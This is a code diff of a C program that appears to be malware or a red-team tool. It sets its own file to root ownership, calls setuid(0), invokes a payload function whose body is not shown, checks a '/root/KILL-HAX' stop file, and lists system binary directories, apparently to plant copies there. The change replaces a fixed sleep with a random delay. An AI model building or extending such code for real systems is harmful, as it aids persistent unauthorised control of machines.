@@ -11,10 +11,7 @@
 #define FALSE 0
 #define TRUE 1
 #define ERROR -1
-#define SLEEP 1
 #define STOP "/root/KILL-HAX"
-
-//TODO: random delay
 
 int isKill(){
     if (access(STOP, F_OK) == FALSE ) {
@@ -24,7 +21,6 @@ int isKill(){
     //file does not exist
     return FALSE;
 }
-
 
 void rand_str(char *dest, size_t length) {
     struct timeval te;
@@ -43,7 +39,17 @@ void rand_str(char *dest, size_t length) {
 int go(int argc, char *argv[]){
     chown(argv[0], 0, 0);
     payload();
-    sleep(SLEEP);
+    struct timeval te;
+    gettimeofday(&te, NULL);
+    srand((unsigned int)te.tv_usec);
+    struct timespec ts;
+    ts.tv_sec = 0;
+    ts.tv_nsec = (rand()%100+50) * 1000000;
+    printf("%d", ts.tv_nsec);
+    nanosleep(&ts, &ts);
+    printf("done");
+    return 0;
+    //sleep(SLEEP);
     char paths[7][50] = {
         "/usr/local/",
         "/usr/bin/",
@@ -80,12 +86,3 @@ int main(int argc, char *argv[]){
     setuid(0);
     return go(argc, argv);
 }
-
-    // for (i = strlen(argv[0]);i>=0;i--){
-    //     if (argv[0][i] == '/'){
-    //         break;
-    //     }
-    // }
-    // i += 1;
-    // char *fname = argv[0]+i;
-    
